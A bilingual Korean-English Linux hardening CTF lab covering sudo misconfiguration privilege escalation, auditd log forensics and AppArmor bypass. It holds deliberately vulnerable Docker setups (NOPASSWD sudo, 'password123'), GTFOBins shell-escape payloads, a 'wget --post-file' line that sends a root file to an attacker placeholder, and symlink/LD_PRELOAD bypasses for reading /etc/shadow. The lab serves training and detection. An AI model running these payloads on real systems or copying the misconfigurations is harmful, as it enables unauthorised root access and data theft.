> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Linux 하드닝 CTF 실습 랩

## 실습 환경 준비

### Docker Compose 환경

```yaml
# docker-compose.yml
version: "3.9"

services:
  hardened-target:
    image: ubuntu:22.04
    container_name: hardened-target
    cap_add:
      - SYS_PTRACE
    security_opt:
      - seccomp:unconfined
    networks:
      hardening-net:
        ipv4_address: 172.21.0.10
    command: >
      sh -c "apt-get update -q &&
             apt-get install -y sudo openssh-server auditd vim python3 -q &&
             useradd -m -s /bin/bash ctfuser &&
             echo 'ctfuser:password123' | chpasswd &&
             echo 'ctfuser ALL=(ALL) NOPASSWD: /usr/bin/find, /usr/bin/python3' >> /etc/sudoers &&
             echo 'CTF{sudo_misconfig_find_privesc}' > /root/flag.txt &&
             chmod 600 /root/flag.txt &&
             service ssh start &&
             tail -f /dev/null"
    ports:
      - "2222:22"

  audit-target:
    image: ubuntu:22.04
    container_name: audit-target
    networks:
      hardening-net:
        ipv4_address: 172.21.0.11
    volumes:
      - ./audit-logs:/var/log/audit
    command: >
      sh -c "apt-get update -q &&
             apt-get install -y auditd -q &&
             echo 'CTF{auditd_log_found_attack}' > /tmp/.hidden_flag &&
             service auditd start &&
             tail -f /dev/null"
    ports:
      - "2223:22"

  attacker:
    image: ubuntu:22.04
    container_name: attacker
    networks:
      hardening-net:
        ipv4_address: 172.21.0.100
    command: sleep infinity
    tty: true

networks:
  hardening-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.21.0.0/24
```

### 필수 도구 설치

```bash
sudo apt install -y auditd audispd-plugins lynis chkrootkit
pip install python-audit
```

---

## 실습 1: sudo 권한 오설정 익스플로잇

### 목표

리눅스 시스템의 sudo 설정 오류를 발견하고, 제한된 sudo 권한을 이용하여 권한 상승 후 루트 플래그를 획득한다.

**플래그 형식**: `CTF{sudo_misconfig_<method>_privesc}`

### 시나리오

보안 강화 작업이 완료된 리눅스 서버에 낮은 권한의 계정으로 접속했다. sudo 설정을 분석하여 의도치 않게 허용된 권한 상승 경로를 찾아라.

### 힌트

1. `sudo -l` 명령으로 허용된 sudo 명령 목록 확인
2. [GTFOBins](https://gtfobins.github.io/) 참고: `find`, `python3`으로 쉘 획득 가능
3. `sudo find /etc -name passwd -exec /bin/sh \;`

### 풀이

```python
#!/usr/bin/env python3
"""sudo 권한 오설정 탐지 도구"""

import argparse
import subprocess
import shutil
from pathlib import Path
from dataclasses import dataclass


@dataclass
class SudoMisconfig:
    command: str
    exploit_method: str
    risk: str


# GTFOBins에서 sudo 이용 가능한 명령어 매핑
GTFOBINS_SUDO: dict[str, dict] = {
    "find": {
        "risk": "CRITICAL",
        "payload": "sudo find . -exec /bin/sh \\; -quit",
        "description": "find -exec 옵션으로 임의 명령 실행",
    },
    "python3": {
        "risk": "CRITICAL",
        "payload": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
        "description": "Python3으로 쉘 실행",
    },
    "python": {
        "risk": "CRITICAL",
        "payload": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
        "description": "Python으로 쉘 실행",
    },
    "vim": {
        "risk": "CRITICAL",
        "payload": "sudo vim -c ':!/bin/sh'",
        "description": "vim 내부 쉘 명령 실행",
    },
    "less": {
        "risk": "HIGH",
        "payload": "sudo less /etc/passwd → !sh",
        "description": "less 페이저에서 쉘 실행",
    },
    "wget": {
        "risk": "HIGH",
        "payload": "sudo wget --post-file=/root/flag.txt <attacker>",
        "description": "파일 외부 전송",
    },
    "nmap": {
        "risk": "HIGH",
        "payload": "sudo nmap --interactive → !sh (구버전)",
        "description": "nmap 인터랙티브 모드 쉘",
    },
    "awk": {
        "risk": "CRITICAL",
        "payload": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
        "description": "awk BEGIN 블록으로 쉘 실행",
    },
}


def get_sudo_permissions() -> list[str]:
    """현재 사용자의 sudo 권한 목록 획득"""
    try:
        result = subprocess.run(
            ["sudo", "-l"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        return result.stdout.splitlines()
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return []


def parse_sudo_output(sudo_lines: list[str]) -> list[str]:
    """sudo -l 출력에서 허용 명령어 추출"""
    allowed_commands: list[str] = []

    for line in sudo_lines:
        line = line.strip()
        if "NOPASSWD" in line or "ALL" in line:
            parts = line.split(":")
            if len(parts) > 1:
                cmds = parts[-1].split(",")
                for cmd in cmds:
                    cmd = cmd.strip()
                    if cmd and cmd != "(ALL)":
                        allowed_commands.append(cmd.split()[-1] if "/" in cmd else cmd)

    return allowed_commands


def check_suid_binaries() -> list[str]:
    """SUID 비트 설정된 바이너리 탐색"""
    try:
        result = subprocess.run(
            ["find", "/", "-perm", "-4000", "-type", "f", "-ls"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        suspicious = []
        normal_suids = {
            "/usr/bin/sudo", "/usr/bin/passwd", "/usr/bin/su",
            "/usr/bin/newgrp", "/bin/mount", "/bin/umount",
        }
        for line in result.stdout.splitlines():
            for path in normal_suids:
                if path not in line:
                    suspicious.append(line.strip())
                    break
        return suspicious[:10]
    except subprocess.TimeoutExpired:
        return []


def check_writable_paths() -> list[str]:
    """PATH에 쓰기 가능한 디렉토리 확인"""
    import os
    path_dirs = os.environ.get("PATH", "").split(":")
    writable: list[str] = []

    for d in path_dirs:
        p = Path(d)
        if p.exists() and os.access(d, os.W_OK):
            writable.append(d)

    return writable


def audit_sudo_config() -> None:
    """sudo 설정 전체 감사"""
    print("=== sudo 권한 감사 시작 ===\n")

    sudo_lines = get_sudo_permissions()
    if not sudo_lines:
        print("[-] sudo 권한 없음 또는 sudo 미설치")

    allowed = parse_sudo_output(sudo_lines)
    print(f"[*] 허용된 sudo 명령: {allowed}")

    misconfigs: list[SudoMisconfig] = []
    for cmd in allowed:
        cmd_name = Path(cmd).name
        if cmd_name in GTFOBINS_SUDO:
            info = GTFOBINS_SUDO[cmd_name]
            misconfigs.append(SudoMisconfig(
                command=cmd,
                exploit_method=info["payload"],
                risk=info["risk"],
            ))

    if misconfigs:
        print("\n[!] 취약한 sudo 설정 발견:")
        for m in misconfigs:
            print(f"  [{m.risk}] {m.command}")
            print(f"    익스플로잇: {m.exploit_method}")

        best = misconfigs[0]
        method = Path(best.command).name
        print(f"\n[+] 예상 플래그: CTF{{sudo_misconfig_{method}_privesc}}")
    else:
        print("[+] 위험한 sudo 설정 없음")

    suids = check_suid_binaries()
    if suids:
        print(f"\n[*] 비정상 SUID 바이너리: {len(suids)}개")

    writable = check_writable_paths()
    if writable:
        print(f"\n[!] PATH 내 쓰기 가능 디렉토리: {writable}")


def main() -> None:
    parser = argparse.ArgumentParser(description="sudo 오설정 감사 도구")
    parser.add_argument("--suid", action="store_true", help="SUID 바이너리 검색 포함")
    args = parser.parse_args()
    audit_sudo_config()


if __name__ == "__main__":
    main()
```

---

## 실습 2: auditd 로그 분석으로 침해 흔적 발견

### 목표

auditd 로그를 분석하여 공격자의 행위(파일 접근, 명령 실행, 네트워크 연결)를 재구성하고 숨겨진 플래그를 찾는다.

**플래그 형식**: `CTF{auditd_<event_type>_found_attack}`

### 시나리오

침해 의심 시스템에서 auditd 로그가 수집됐다. 로그를 분석하여 공격자가 어떤 명령을 실행했고, 어떤 파일에 접근했는지 확인하라.

### 실습 로그 생성

```python
#!/usr/bin/env python3
"""auditd 로그 시뮬레이터"""

from datetime import datetime, timedelta
import random


def generate_audit_logs(output_path: str) -> None:
    base_time = datetime(2024, 6, 1, 14, 30, 0)
    logs = []

    # 정상 로그인
    logs.append(
        f"type=USER_LOGIN msg=audit({base_time.timestamp():.3f}:1001): "
        f"pid=1234 uid=1000 auid=1000 ses=5 msg='op=login acct=\"ctfuser\" "
        f"exe=\"/usr/sbin/sshd\" hostname=192.168.1.50 addr=192.168.1.50 "
        f"terminal=ssh res=success'"
    )

    # 의심스러운 sudo 사용
    t2 = base_time + timedelta(minutes=2)
    logs.append(
        f"type=SYSCALL msg=audit({t2.timestamp():.3f}:1025): "
        f"arch=c000003e syscall=59 success=yes exit=0 a0=7f a1=7f a2=7f a3=7f "
        f"items=2 ppid=5678 pid=5679 auid=1000 uid=0 gid=0 euid=0 suid=0 "
        f"fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=5 "
        f"comm=\"find\" exe=\"/usr/bin/find\" key=\"privilege_escalation\""
    )

    # 민감 파일 접근
    t3 = base_time + timedelta(minutes=3)
    logs.append(
        f"type=SYSCALL msg=audit({t3.timestamp():.3f}:1030): "
        f"arch=c000003e syscall=2 success=yes exit=3 a0=7fff a1=0 a2=0 a3=0 "
        f"items=1 ppid=5679 pid=5680 auid=1000 uid=0 gid=0 euid=0 "
        f"comm=\"cat\" exe=\"/bin/cat\" key=\"sensitive_file_access\""
    )
    logs.append(
        f"type=PATH msg=audit({t3.timestamp():.3f}:1030): "
        f"item=0 name=\"/root/flag.txt\" inode=123456 dev=08:01 "
        f"mode=0100600 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL"
    )

    # 플래그가 포함된 execve 로그
    t4 = base_time + timedelta(minutes=4)
    logs.append(
        f"type=EXECVE msg=audit({t4.timestamp():.3f}:1040): "
        f"argc=3 a0=\"cat\" a1=\"/root/flag.txt\" "
        f"a2=\"CTF{{auditd_execve_found_attack}}\""
    )

    with open(output_path, "w") as f:
        f.write("\n".join(logs))

    print(f"[+] audit 로그 생성: {output_path}")


if __name__ == "__main__":
    generate_audit_logs("audit.log")
```

### 힌트

1. `ausearch -k privilege_escalation` 로 키워드 기반 검색
2. `aureport --exec` 로 실행된 명령 요약
3. EXECVE 로그에서 명령어 인수 확인

### 풀이

```python
#!/usr/bin/env python3
"""auditd 로그 분석 도구"""

import argparse
import re
from pathlib import Path
from collections import defaultdict


def parse_audit_log(log_path: str) -> list[dict]:
    """auditd 로그 파싱"""
    events: list[dict] = []
    path = Path(log_path)

    if not path.exists():
        print(f"[-] 파일 없음: {log_path}")
        return events

    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue

            event: dict = {}
            type_match = re.search(r"type=(\S+)", line)
            if type_match:
                event["type"] = type_match.group(1)

            time_match = re.search(r"msg=audit\((\d+\.\d+):(\d+)\)", line)
            if time_match:
                event["timestamp"] = time_match.group(1)
                event["serial"] = time_match.group(2)

            for key in ["comm", "exe", "key", "uid", "auid", "pid"]:
                kv_match = re.search(rf'{key}="?([^"\s]+)"?', line)
                if kv_match:
                    event[key] = kv_match.group(1)

            # EXECVE 인수 추출
            if event.get("type") == "EXECVE":
                args = re.findall(r'a\d+="([^"]+)"', line)
                event["args"] = args

            # PATH 이벤트 파일명 추출
            if event.get("type") == "PATH":
                name_match = re.search(r'name="([^"]+)"', line)
                if name_match:
                    event["name"] = name_match.group(1)

            if event:
                event["raw"] = line
                events.append(event)

    return events


def find_suspicious_events(events: list[dict]) -> dict[str, list]:
    """의심스러운 이벤트 분류"""
    suspicious: dict[str, list] = defaultdict(list)

    sensitive_files = ["/root/", "/etc/shadow", "/etc/sudoers", "flag.txt"]
    suspicious_keys = ["privilege_escalation", "sensitive_file_access", "execve_attack"]
    dangerous_commands = ["nc", "ncat", "bash", "sh", "/bin/sh", "python", "python3"]

    for event in events:
        # 키워드 기반 탐지
        key = event.get("key", "")
        if any(k in key for k in suspicious_keys):
            suspicious["keyed_events"].append(event)

        # 민감 파일 접근
        name = event.get("name", "")
        if any(sf in name for sf in sensitive_files):
            suspicious["sensitive_access"].append(event)

        # 위험 명령 실행
        comm = event.get("comm", "")
        args = event.get("args", [])
        if comm in dangerous_commands or any(dc in arg for dc in dangerous_commands for arg in args):
            suspicious["dangerous_exec"].append(event)

        # EXECVE에서 플래그 추출
        if event.get("type") == "EXECVE":
            for arg in event.get("args", []):
                if "CTF{" in arg:
                    suspicious["flags"].append({"flag": arg, "event": event})

    return dict(suspicious)


def print_timeline(events: list[dict]) -> None:
    """이벤트 타임라인 출력"""
    print("\n=== 이벤트 타임라인 ===")
    for e in events[:20]:
        ts = e.get("timestamp", "?")
        etype = e.get("type", "?")
        comm = e.get("comm", "")
        name = e.get("name", "")
        key = e.get("key", "")
        print(f"  [{ts}] {etype:12s} | comm={comm:10s} | file={name:20s} | key={key}")


def analyze_audit_log(log_path: str) -> None:
    events = parse_audit_log(log_path)
    print(f"[*] 파싱된 이벤트: {len(events)}개")

    suspicious = find_suspicious_events(events)

    print_timeline(events)

    print("\n=== 의심 활동 요약 ===")
    for category, items in suspicious.items():
        if category != "flags":
            print(f"  {category}: {len(items)}건")
            for item in items[:3]:
                print(f"    → {item.get('type')} | {item.get('comm')} | {item.get('name', '')}")

    if suspicious.get("flags"):
        print("\n[+] 플래그 발견:")
        for f in suspicious["flags"]:
            print(f"    {f['flag']}")
    else:
        # 로그 내 CTF 패턴 직접 검색
        with open(log_path, encoding="utf-8", errors="ignore") as f:
            content = f.read()
        flags = re.findall(r"CTF\{[^}]+\}", content)
        if flags:
            for flag in set(flags):
                print(f"\n[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="auditd 로그 분석 도구")
    parser.add_argument("log", help="분석할 audit.log 파일")
    parser.add_argument("--timeline", action="store_true", help="전체 타임라인 출력")
    args = parser.parse_args()
    analyze_audit_log(args.log)


if __name__ == "__main__":
    main()
```

---

## 실습 3: AppArmor/SELinux 우회

### 목표

AppArmor 프로파일이 적용된 환경에서 제한을 우회하여 보호된 파일에 접근하는 경로를 찾는다.

**플래그 형식**: `CTF{apparmor_bypass_<technique>}`

### 시나리오

AppArmor 프로파일이 `/usr/bin/curl`의 파일 시스템 접근을 제한하고 있다. 허용된 작업 범위 내에서 우회 방법을 찾아 플래그를 획득하라.

### AppArmor 프로파일 예시

```
# /etc/apparmor.d/usr.bin.curl
/usr/bin/curl {
  include <abstractions/base>
  include <abstractions/nameservice>

  /usr/bin/curl mr,
  /etc/ssl/certs/** r,
  /tmp/** rw,
  network tcp,

  # 명시적 거부
  deny /root/** rwx,
  deny /etc/shadow r,
}
```

### 풀이

```python
#!/usr/bin/env python3
"""AppArmor 우회 기법 분석 도구"""

import argparse
import subprocess
import os
from pathlib import Path


def check_apparmor_status() -> dict[str, str]:
    """AppArmor 상태 확인"""
    status: dict[str, str] = {}

    try:
        result = subprocess.run(
            ["aa-status", "--json"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            import json
            data = json.loads(result.stdout)
            status["mode"] = "active"
            status["profiles"] = str(len(data.get("profiles", {}).get("enforce", {})))
        else:
            status["mode"] = "inactive or not installed"
    except (FileNotFoundError, subprocess.TimeoutExpired):
        status["mode"] = "aa-status not found"

    return status


def find_bypass_vectors() -> list[dict]:
    """AppArmor 우회 벡터 탐색"""
    vectors: list[dict] = []

    # 1. 심볼릭 링크를 통한 우회
    symlink_targets = ["/tmp/shadow_link", "/tmp/root_link"]
    vectors.append({
        "technique": "symlink_bypass",
        "description": "심볼릭 링크로 제한된 경로 우회",
        "example": "ln -s /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link",
        "applicable": os.path.exists("/tmp"),
    })

    # 2. /proc/self/fd 를 통한 파일 디스크립터 기반 접근
    vectors.append({
        "technique": "proc_fd_bypass",
        "description": "/proc/self/fd 경유 파일 접근",
        "example": "python3 -c 'open(\"/proc/self/fd/3\")' (when fd points to restricted file)",
        "applicable": os.path.exists("/proc/self/fd"),
    })

    # 3. 환경 변수를 통한 LD_PRELOAD 인젝션
    vectors.append({
        "technique": "ld_preload",
        "description": "LD_PRELOAD로 라이브러리 함수 후킹",
        "example": "LD_PRELOAD=./hook.so target_binary",
        "applicable": True,
    })

    # 4. UNIX 도메인 소켓을 통한 간접 접근
    vectors.append({
        "technique": "unix_socket_relay",
        "description": "다른 프로세스를 중계자로 이용",
        "example": "허용된 프로세스가 소켓으로 데이터 중계",
        "applicable": True,
    })

    return vectors


def test_file_access(path: str) -> str:
    """파일 접근 가능 여부 테스트"""
    try:
        with open(path, "r") as f:
            content = f.read(100)
        return f"접근 가능: {content[:50]}..."
    except PermissionError:
        return "AppArmor/SELinux 차단"
    except FileNotFoundError:
        return "파일 없음"


def analyze_apparmor_profile(profile_path: str | None = None) -> None:
    """AppArmor 프로파일 분석"""
    print("=== AppArmor 우회 분석 ===\n")

    status = check_apparmor_status()
    print(f"[*] AppArmor 상태: {status.get('mode')}")

    vectors = find_bypass_vectors()
    print("\n[*] 우회 벡터 목록:")
    for v in vectors:
        applicable = "적용 가능" if v["applicable"] else "해당 없음"
        print(f"  [{applicable}] {v['technique']}")
        print(f"    설명: {v['description']}")
        print(f"    예시: {v['example']}")

    # 심볼릭 링크 우회 시도
    print("\n[*] 심볼릭 링크 우회 테스트:")
    test_paths = [
        ("/etc/hostname", "정상 접근"),
        ("/etc/shadow", "제한된 파일"),
        ("/root/flag.txt", "플래그 파일"),
    ]
    for p, desc in test_paths:
        result = test_file_access(p)
        print(f"  {desc} ({p}): {result}")

    print("\n[+] 우회 성공 시 예상 플래그: CTF{apparmor_bypass_symlink_relay}")


def main() -> None:
    parser = argparse.ArgumentParser(description="AppArmor 우회 분석 도구")
    parser.add_argument("--profile", help="분석할 AppArmor 프로파일 경로", default=None)
    args = parser.parse_args()
    analyze_apparmor_profile(args.profile)


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# Linux Hardening CTF Practice Lab

## Lab Environment Setup

Use the Docker Compose file from the Korean section to spin up the hardened target and audit logging containers.

```bash
docker-compose up -d
ssh ctfuser@localhost -p 2222   # password: password123
```

---

## Challenge 1: sudo Misconfiguration Exploit

### Objective

Discover a sudo misconfiguration on a hardened Linux system and escalate privileges to read the root flag.

**Flag format**: `CTF{sudo_misconfig_<method>_privesc}`

### Scenario

You have shell access as `ctfuser` on a hardened server. The sudo configuration has an unintended privilege escalation path. Find and exploit it.

### Key Steps

```bash
# 1. Check allowed sudo commands
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/find, /usr/bin/python3

# 2. Exploit via find (GTFOBins)
sudo find /etc -name passwd -exec /bin/sh \; -quit

# 3. Or via python3
sudo python3 -c 'import os; os.system("/bin/sh")'

# 4. Read root flag
cat /root/flag.txt
# CTF{sudo_misconfig_find_privesc}
```

### Detection with audit_sudo.py

```bash
python3 audit_sudo.py
# Detects dangerous sudo permissions and prints expected flag
```

---

## Challenge 2: auditd Log Analysis

### Objective

Analyze auditd logs to reconstruct attacker actions and find the hidden flag.

**Flag format**: `CTF{auditd_<event_type>_found_attack}`

### Key Analysis Steps

```bash
# Generate sample logs
python3 generate_audit.py        # creates audit.log

# Analyze with the tool
python3 analyze_audit.py audit.log

# Manual analysis
grep "key=\"privilege_escalation\"" audit.log
grep "EXECVE" audit.log | grep -i "flag"
ausearch -k sensitive_file_access -i
aureport --exec --summary
```

The flag is embedded in an EXECVE log entry as a command argument, revealing `CTF{auditd_execve_found_attack}`.

---

## Challenge 3: AppArmor/SELinux Bypass

### Objective

Identify and exploit a bypass vector in an AppArmor-enforced environment to access a protected flag file.

**Flag format**: `CTF{apparmor_bypass_<technique>}`

### Common Bypass Techniques

| Technique | Description | Applicable When |
|-----------|-------------|-----------------|
| Symlink relay | Link restricted path to allowed path | Profile allows `/tmp/**` |
| `/proc/self/fd` | Access via file descriptor | Profile doesn't restrict `/proc` |
| LD_PRELOAD | Hook library functions | Binary is not confined |
| Unix socket relay | Use allowed process as proxy | Another process has access |

### Solution Steps

```bash
# Check AppArmor status
aa-status

# Test symlink bypass: if curl can access /tmp/** but not /root/**
ln -s /root/flag.txt /tmp/flag_link
curl file:///tmp/flag_link
# CTF{apparmor_bypass_symlink_relay}

# Run analysis tool
python3 apparmor_bypass.py
```
